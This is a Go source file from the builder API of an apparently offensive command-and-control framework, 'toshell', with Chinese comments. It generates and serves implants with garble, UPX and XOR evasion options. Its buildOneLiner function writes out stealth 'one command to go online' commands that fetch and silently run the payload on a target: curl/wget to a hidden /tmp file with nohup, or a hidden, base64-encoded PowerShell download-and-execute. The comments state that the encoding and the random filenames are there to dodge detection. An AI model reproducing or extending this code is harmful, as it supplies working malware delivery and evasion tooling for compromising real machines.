package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/gorilla/mux"
	"toshell/internal/server/builder"
	"toshell/internal/server/database"
	"toshell/internal/server/logging"
)

func (s *Server) listBuildersHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	formats := []string{"exe", "dll", "shellcode", "shellcode_bin", "raw"}
	protocols := []string{"http", "https", "websocket", "mqtt"}
	osList := []string{"windows", "linux", "darwin"}
	archList := []string{"amd64", "386", "arm64"}

	garbleAvail := false
	upxAvail := false
	cAvail := false
	if s.builder != nil {
		garbleAvail = s.builder.GarbleAvailable()
		upxAvail = s.builder.UPXAvailable()
		cAvail = s.builder.CLanguageAvailable()
	}

	// Return real listeners from the database so the frontend can pick one
	// when generating a payload.
	listeners := []ListenerInfo{}
	if db := database.Get(); db != nil {
		if all, err := db.ListListeners(); err == nil {
			listeners = make([]ListenerInfo, 0, len(all))
			for _, l := range all {
				listeners = append(listeners, listToResponse(l))
			}
		}
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"formats":   formats,
		"protocols": protocols,
		"os":        osList,
		"arch":      archList,
		"listeners": listeners,
		"languages": map[string]interface{}{
			"go":        true, // Go 植入端：全功能
			"c":         cAvail, // C 植入端：体积极小（~50KB），仅 Windows exe，基础功能
			"c_message": "C 植入端需服务端安装 mingw-w64 gcc（MSYS2），支持 Windows x86/x64",
		},
		"options": map[string]interface{}{
			"interval":    map[string]uint32{"min": 1, "max": 300, "default": 60},
			"jitter":      map[string]uint32{"min": 0, "max": 100, "default": 10},
			"retry_count": map[string]uint32{"min": 0, "max": 10, "default": 3},
			"retry_wait":  map[string]uint32{"min": 1, "max": 60, "default": 5},
		},
		"evasion": map[string]bool{
			"garble_available": garbleAvail,
			"upx_available":    upxAvail,
		},
	})
}

func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != http.MethodPost {
		http.Error(w, `{"error":"Method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	var req BuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	if req.Name == "" {
		req.Name = fmt.Sprintf("implant-%d", time.Now().Unix())
	}
	if req.Format == "" {
		req.Format = "exe"
	}
	if req.Interval == 0 {
		req.Interval = 5
	}
	if req.Jitter == 0 {
		req.Jitter = 2
	}
	if req.RetryCount == 0 {
		req.RetryCount = 3
	}
	if req.RetryWait == 0 {
		req.RetryWait = 5
	}

	s.applyListenerDefaults(&req)

	if req.ServerURL == "" {
		req.ServerURL = fmt.Sprintf("http://localhost:%d", s.cfg.Server.Port)
	}
	if req.Protocol == "" {
		req.Protocol = "http"
	}

	// 防呆：TCP 通道的 server_url 即使误带 http(s):// 前缀也自动剥离
	// （前缀会让植入端误判为 HTTP 轮询通道，而 TCP 监听器不是 HTTP 服务，
	// 导致注册失败反复重连）。
	// 注意：websocket 通道必须保留 ws:// 前缀（植入端据此选择 WS 传输），
	// 且 stripURLScheme 不处理 ws://（避免 "ws://host:port" 被截断成 "ws:"）。
	if req.Protocol == "tcp" {
		req.ServerURL = stripURLScheme(req.ServerURL)
	}

	opts := builder.BuildOptions{
		Format:       req.Format,
		Language:     req.Language,
		ListenerID:   req.ListenerID,
		ServerURL:    req.ServerURL,
		Protocol:     req.Protocol,
		Interval:     req.Interval,
		Jitter:       req.Jitter,
		RetryCount:   req.RetryCount,
		RetryWait:    req.RetryWait,
		KillDate:     req.KillDate,
		WorkingHours: req.WorkingHours,
		RelayListen:  req.RelayListen,
		FrontDomain:  req.FrontDomain,
		Profile:      req.Profile,
		OS:           req.OS,
		Arch:         req.Arch,
		// Evasion options
		XOREncrypt:   req.XOREncrypt,
		XORKeySize:   req.XORKeySize,
		GarbleEnable: req.GarbleEnable,
		UPXEnable:    req.UPXEnable,
	}

	result, err := s.builder.Build(opts)
	if err != nil {
		logging.Error("builder", "Build failed: %v", err)
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	buildID := fmt.Sprintf("build-%d", time.Now().UnixNano())

	// 以唯一 ID 命名产物文件，避免同名载荷互相覆盖导致列表下载串文件。
	ext := payloadExt(req.Format, req.OS)
	filename := buildID
	if ext != "" {
		filename = buildID + "." + ext
	}

	// shellcode 格式保存/下载 hex 文本（每个字节转 2 个十六进制字符）。
	// 体积为原始字节的 2 倍，但兼容需要直接粘贴 hex 的使用场景；
	// Size 按实际下载文件大小计算，页面显示与下载一致。
	saveData := result.Binary
	if req.Format == "shellcode" {
		saveData = []byte(result.ShellcodeHex)
	}

	response := BuildResponse{
		ID:          buildID,
		Name:        req.Name,
		Format:      req.Format,
		Size:        len(saveData),
		SHA256:      result.SHA256,
		BuildTime:   result.BuildTime.Format(time.RFC3339),
		DownloadURL: fmt.Sprintf("/api/v1/implants/stored/%s", buildID),
		OneLiner:    s.buildOneLiner(&req, buildID),
	}

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}
	if err := os.MkdirAll(implantDir, 0755); err == nil {
		if err := os.WriteFile(filepath.Join(implantDir, filename), saveData, 0755); err != nil {
			logging.Warn("builder", "Failed to save implant: %v", err)
		} else {
			logging.Info("builder", "Implant saved to: %s", filepath.Join(implantDir, filename))
		}
		// 移除 builder 按旧规则(名称)写入的副本，避免一次生成留下两个文件。
		// 必须按 builder 实际写盘的文件名（GetOutputFilename）精确删除，
		// 否则对 raw 等格式（builder 写无扩展名文件）会残留旧文件导致列表出现两条。
		_ = os.Remove(filepath.Join(implantDir, s.builder.GetOutputFilename(opts)))
		// 兜底：历史遗留的 name.ext 形式副本一并清理
		if req.Name != "" {
			oldName := req.Name
			if oldExt := payloadExt(req.Format, req.OS); oldExt != "" {
				oldName = req.Name + "." + oldExt
			}
			_ = os.Remove(filepath.Join(implantDir, oldName))
		}
	}

	// Save to database for persistent implant list
	if db := database.Get(); db != nil {
		now := time.Now().Unix()
		optsJSON, _ := json.Marshal(map[string]interface{}{
			"interval":      req.Interval,
			"jitter":        req.Jitter,
			"retry_count":   req.RetryCount,
			"retry_wait":    req.RetryWait,
			"kill_date":     req.KillDate,
			"working_hours": req.WorkingHours,
			"xor_encrypt":   req.XOREncrypt,
			"garble":        req.GarbleEnable,
			"upx":           req.UPXEnable,
		})
		db.CreateImplant(&database.StoredImplant{
			ID:          response.ID,
			Name:        req.Name,
			Format:      req.Format,
			OS:          req.OS,
			Arch:        req.Arch,
			Protocol:    req.Protocol,
			ServerURL:   req.ServerURL,
		Size:        int64(len(saveData)),
		SHA256:      result.SHA256,
		Filename:    filename,
			CreatedAt:   now,
			OptionsJSON: string(optsJSON),
		})
	}

	logging.Info("builder", "Payload built: %s (%s)", req.Name, req.Format)

	json.NewEncoder(w).Encode(response)
}

// serveFileDownload 以流式方式返回磁盘文件(支持 Range 与断点续传),
// 避免大文件一次性读入内存。
func serveFileDownload(w http.ResponseWriter, r *http.Request, path, fallbackName string) {
	info, err := os.Stat(path)
	if err != nil {
		http.Error(w, `{"error":"file not found"}`, http.StatusNotFound)
		return
	}
	f, err := os.Open(path)
	if err != nil {
		http.Error(w, `{"error":"cannot open file"}`, http.StatusInternalServerError)
		return
	}
	defer f.Close()

	name := fallbackName
	if name == "" {
		name = filepath.Base(path)
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", name))
	http.ServeContent(w, r, name, info.ModTime(), f)
}

// downloadPayloadHandler 只负责下载已构建好的载荷文件,绝不触发重新构建。
// 优先按请求中的 ID 精确匹配数据库记录;兼容旧调用按名称在磁盘上查找。
// 找不到时返回明确的错误,由前端引导用户先重新生成载荷。
func (s *Server) downloadPayloadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/octet-stream")

	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req BuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// 优先按 ID 从数据库找到精确记录再下载,避免同名串文件。
	if req.ID != "" {
		if db := database.Get(); db != nil {
			if imp, err := db.GetImplant(req.ID); err == nil {
				s.serveStoredImplant(w, r, imp)
				return
			}
		}
	}

	// 兼容旧调用:按名称在磁盘上查找已存在的载荷文件。
	if req.Name != "" {
		implantDir := s.cfg.Implant.OutputDir
		if implantDir == "" {
			implantDir = "./implants"
		}
		exts := []string{req.Format, "exe", "dll", "bin", "txt", "raw", "so"}
		for _, ext := range exts {
			if ext == "" {
				continue
			}
			p := filepath.Join(implantDir, req.Name+"."+ext)
			if _, err := os.Stat(p); err == nil {
				serveFileDownload(w, r, p, "")
				return
			}
		}
	}

	// 下载是只读操作:找不到文件时直接报错,绝不在此重新编译。
	http.Error(w, `{"error":"未找到已构建的载荷文件，请先重新生成载荷后再下载"}`, http.StatusNotFound)
}

// buildOneLiner 生成"一条命令上线"命令：在目标机执行该命令即可静默下载并运行
// 刚生成的载荷（下载端点免认证，URL 含载荷 ID）。
// 不同监听器对应不同载荷，命令中的下载 URL 指向该监听器的 web 后台。
// Windows 使用 PowerShell -enc（UTF-16LE Base64）执行，避开 Invoke-WebRequest
// / -ep bypass 等明文特征；Linux 使用 curl（回退 wget）下载后后台运行。
func (s *Server) buildOneLiner(req *BuildRequest, buildID string) string {
	osName := strings.ToLower(req.OS)
	if osName != "" && osName != "windows" && osName != "linux" {
		return ""
	}
	// 仅可直接运行的载荷支持一条命令上线：
	// Windows 为 exe/raw；Linux 为 bin/exe/raw（so 是动态库，不能直接执行）。
	switch osName {
	case "linux":
		if req.Format != "exe" && req.Format != "raw" && req.Format != "bin" {
			return ""
		}
	default: // windows 或未指定，按 Windows 处理
		if req.Format != "exe" && req.Format != "raw" {
			return ""
		}
	}

	host := "localhost"
	if u, err := url.Parse(req.ServerURL); err == nil && u.Hostname() != "" {
		host = u.Hostname()
	}

	scheme := "http"
	if s.cfg.Server.TLSCert != "" && s.cfg.Server.TLSKey != "" {
		scheme = "https"
	}
	port := s.cfg.Server.APIPort
	if port == 0 {
		port = 8081
	}

	dlURL := fmt.Sprintf("%s://%s:%d/api/v1/implant/payload/%s", scheme, host, port, buildID)

	switch osName {
	case "linux":
		tmp := fmt.Sprintf("/tmp/.%s", randName(4))
		return fmt.Sprintf(
			`curl -fsSL '%s' -o %s 2>/dev/null || wget -qO %s '%s'; chmod +x %s; nohup %s >/dev/null 2>&1 &`,
			dlURL, tmp, tmp, dlURL, tmp, tmp)
	default: // windows（或未指定，按 Windows 处理）
		tmp := randName(4) + ".exe"
		ps := fmt.Sprintf(
			`$p="$env:TEMP\%s";$w=New-Object Net.WebClient;$w.DownloadFile('%s',$p);Start-Process $p -WindowStyle Hidden`,
			tmp, dlURL)
		return fmt.Sprintf("powershell -w hidden -nop -enc %s", encodeUTF16LE(ps))
	}
}

// randName 生成 n 位小写字母数字随机串，用于随机化载荷落地文件名，降低固定
// 文件名（如 svc.exe）被静态特征匹配的概率。
func randName(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rng.Intn(len(letters))]
	}
	return string(b)
}

// encodeUTF16LE 将字符串按 UTF-16LE 编码后做 Base64，供 powershell -enc 使用，
// 使下载 URL / 落地文件名 / API 名称在命令行中不可见。
func encodeUTF16LE(s string) string {
	u := utf16.Encode([]rune(s))
	b := make([]byte, len(u)*2)
	for i, v := range u {
		b[i*2] = byte(v)
		b[i*2+1] = byte(v >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

// applyListenerDefaults fills in ServerURL and Protocol from the selected
// listener (if any) so the built payload points at a real listener.
func (s *Server) applyListenerDefaults(req *BuildRequest) {
	if req.ListenerID == "" {
		return
	}
	db := database.Get()
	if db == nil {
		return
	}
	all, err := db.ListListeners()
	if err != nil {
		return
	}
	for _, l := range all {
		if l.ID != req.ListenerID {
			continue
		}
		// Prefer the public address when one is configured; otherwise fall back
		// to the bind address (with 0.0.0.0 mapped to localhost).
		host := l.PublicAddr
		if host == "" {
			host = l.BindAddr
			if host == "" || host == "0.0.0.0" {
				host = "localhost"
			}
		}
		scheme := "http"
		if l.Protocol == "https" {
			scheme = "https"
		} else if l.Protocol == "websocket" {
			scheme = "ws"
		} else if l.Protocol == "mqtt" {
			scheme = "mqtt"
		}
		if req.ServerURL == "" {
			req.ServerURL = fmt.Sprintf("%s://%s:%d", scheme, host, l.BindPort)
		}
		if req.Protocol == "" {
			req.Protocol = l.Protocol
		}
		return
	}
}

// listStoredImplantsHandler lists payloads that actually exist in the payload
// output directory, enriched with metadata from the database. Database records
// whose file no longer exists on disk are cleaned up automatically, so the
// list always reflects the real state of the payload directory.
func (s *Server) listStoredImplantsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	// 1. Snapshot the files currently present in the payload directory.
	files := make(map[string]os.FileInfo)
	if entries, err := os.ReadDir(implantDir); err == nil {
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			if info, err := entry.Info(); err == nil {
				files[entry.Name()] = info
			}
		}
	}

	// 2. Load DB records, keeping only those whose file still exists on disk.
	//    Orphan records (file deleted) are removed from the database.
	var implants []*database.StoredImplant
	if db := database.Get(); db != nil {
		if all, err := db.ListImplants(); err == nil {
			for _, imp := range all {
				if name, ok := s.locateImplantFile(files, imp); ok {
					imp.Filename = name
					implants = append(implants, imp)
				} else {
					logging.Warn("builder", "Cleaning up orphan implant record %s (%s): file not found on disk", imp.ID, imp.Name)
					_ = db.DeleteImplant(imp.ID)
				}
			}
		}
	}

	if implants == nil {
		implants = []*database.StoredImplant{}
	}

	// 3. Merge in files from the output directory that have no DB record.
	claimed := make(map[string]bool, len(implants))
	for _, imp := range implants {
		claimed[imp.Filename] = true
	}

	for name, info := range files {
		if claimed[name] {
			continue
		}
		ext := strings.TrimPrefix(filepath.Ext(name), ".")
		base := strings.TrimSuffix(name, filepath.Ext(name))
		osName := "windows"
		switch ext {
		case "so", "bin":
			osName = "linux"
		}
		// Untracked files use a synthetic ID so download/delete work.
		implants = append(implants, &database.StoredImplant{
			ID:        "file:" + name,
			Name:      base,
			Format:    ext,
			OS:        osName,
			Protocol:  "http",
			Size:      info.Size(),
			Filename:  name,
			CreatedAt: info.ModTime().Unix(),
		})
	}

	// Sort newest first (DB entries use Unix timestamps, file entries as well).
	sort.Slice(implants, func(i, j int) bool {
		return implants[i].CreatedAt > implants[j].CreatedAt
	})

	json.NewEncoder(w).Encode(map[string]interface{}{"implants": implants})
}

// payloadExt 返回与 builder.GetOutputFilename 一致的产物扩展名(不含点)。
func payloadExt(format, osName string) string {
	switch format {
	case "exe":
		return "exe"
	case "dll":
		return "dll"
	case "bin":
		if osName == "windows" {
			return "exe"
		}
		return ""
	case "so":
		return "so"
	case "shellcode":
		return "txt" // hex 文本
	case "shellcode_bin":
		return "bin"
	case "raw":
		return "raw"
	default:
		return ""
	}
}

// locateImplantFile finds the real file on disk for a DB record, mirroring the
// lookup used by serveStoredImplant. It returns the matching file name and true
// when the payload file actually exists in the directory. 只做精确匹配,
// 不再用名称前缀扫描,避免 "test" 匹配到 "test2.exe" 之类的串文件。
func (s *Server) locateImplantFile(files map[string]os.FileInfo, imp *database.StoredImplant) (string, bool) {
	if imp.Filename != "" {
		if _, ok := files[imp.Filename]; ok {
			return imp.Filename, true
		}
	}
	if imp.Name != "" {
		patterns := []string{
			imp.Name + "." + imp.Format,
			imp.Name + "." + payloadExt(imp.Format, imp.OS),
			imp.Name + ".exe",
			imp.Name + ".dll",
			imp.Name + ".bin",
			imp.Name + ".txt",
			imp.Name + ".so",
			imp.Name + ".raw",
		}
		for _, p := range patterns {
			if p != "" {
				if _, ok := files[p]; ok {
					return p, true
				}
			}
		}
	}
	return "", false
}

// serveStoredImplant 流式返回指定数据库记录对应的载荷文件。
// 优先使用记录中的唯一文件名;兼容旧记录按名称+格式精确回退。
// 下载名使用友好的 name.ext,磁盘上则是唯一 ID 文件名。
func (s *Server) serveStoredImplant(w http.ResponseWriter, r *http.Request, imp *database.StoredImplant) {
	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	candidates := []string{
		filepath.Join(implantDir, imp.Filename),
		filepath.Join(implantDir, imp.Name+"."+imp.Format),
		filepath.Join(implantDir, imp.Name+"."+payloadExt(imp.Format, imp.OS)),
		filepath.Join(implantDir, imp.Name+".exe"),
		filepath.Join(implantDir, imp.Name+".txt"),
	}

	var filePath string
	for _, p := range candidates {
		if p == "" {
			continue
		}
		if _, err := os.Stat(p); err == nil {
			filePath = p
			break
		}
	}

	if filePath == "" {
		http.Error(w, `{"error":"Implant file not found on disk"}`, http.StatusNotFound)
		return
	}

	dlName := imp.Name + filepath.Ext(filePath)
	if imp.Name == "" {
		dlName = filepath.Base(filePath)
	}
	serveFileDownload(w, r, filePath, dlName)
}

func (s *Server) downloadStoredImplantHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	// Directory-only entries carry a "file:" prefixed synthetic ID.
	if strings.HasPrefix(id, "file:") {
		filePath := filepath.Join(implantDir, strings.TrimPrefix(id, "file:"))
		if _, err := os.Stat(filePath); os.IsNotExist(err) {
			http.Error(w, `{"error":"Implant file not found on disk"}`, http.StatusNotFound)
			return
		}
		serveFileDownload(w, r, filePath, "")
		return
	}

	db := database.Get()
	if db == nil {
		http.Error(w, `{"error":"Database not available"}`, http.StatusInternalServerError)
		return
	}

	imp, err := db.GetImplant(id)
	if err != nil {
		http.Error(w, `{"error":"Implant not found"}`, http.StatusNotFound)
		return
	}

	s.serveStoredImplant(w, r, imp)
}

func (s *Server) listImplantsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	var implants []ImplantsInfo

	entries, err := os.ReadDir(implantDir)
	if err != nil {
		if os.IsNotExist(err) {
			json.NewEncoder(w).Encode(map[string]interface{}{"implants": []interface{}{}})
			return
		}
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		info, err := entry.Info()
		if err != nil {
			continue
		}

		ext := filepath.Ext(entry.Name())
		implants = append(implants, ImplantsInfo{
			Name:    entry.Name(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
			Format:  strings.TrimPrefix(ext, "."),
		})
	}

	sort.Slice(implants, func(i, j int) bool {
		return implants[i].ModTime > implants[j].ModTime
	})

	json.NewEncoder(w).Encode(map[string]interface{}{"implants": implants})
}

func (s *Server) downloadImplantHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	if name == "" {
		http.Error(w, `{"error":"Name is required"}`, http.StatusBadRequest)
		return
	}

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	filePath := filepath.Join(implantDir, name)

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		http.Error(w, `{"error":"File not found"}`, http.StatusNotFound)
		return
	}

	serveFileDownload(w, r, filePath, name)
}

func (s *Server) deleteStoredImplantHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	implantDir := s.cfg.Implant.OutputDir
	if implantDir == "" {
		implantDir = "./implants"
	}

	// Directory-only entries carry a "file:" prefixed synthetic ID; only the
	// file on disk is removed, there is no DB record to clean up.
	if strings.HasPrefix(id, "file:") {
		filePath := filepath.Join(implantDir, strings.TrimPrefix(id, "file:"))
		if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
			http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
			return
		}
		json.NewEncoder(w).Encode(map[string]interface{}{
			"message": "Implant file deleted",
			"id":      id,
		})
		return
	}

	db := database.Get()
	if db == nil {
		http.Error(w, `{"error":"Database not available"}`, http.StatusInternalServerError)
		return
	}

	imp, err := db.GetImplant(id)
	if err != nil {
		http.Error(w, `{"error":"Implant not found"}`, http.StatusNotFound)
		return
	}

	// Delete file from disk
	filePath := filepath.Join(implantDir, imp.Filename)
	os.Remove(filePath)

	// Delete from database
	if err := db.DeleteImplant(id); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"message": "Implant deleted",
		"id":      id,
	})
}

// stripURLScheme 剥离 server_url 的 http(s):// 前缀（保留 host:port）。
// 用于 TCP 通道防呆：避免前缀误导植入端选择 HTTP 轮询通道。
// 注意：不处理 ws:// 前缀（websocket 通道需保留，且此函数不匹配它）。
func stripURLScheme(addr string) string {
	a := strings.TrimSpace(addr)
	for _, p := range []string{"https://", "http://"} {
		if strings.HasPrefix(a, p) {
			a = a[len(p):]
			break
		}
	}
	// 去掉尾部路径
	if i := strings.Index(a, "/"); i >= 0 {
		a = a[:i]
	}
	return a
}
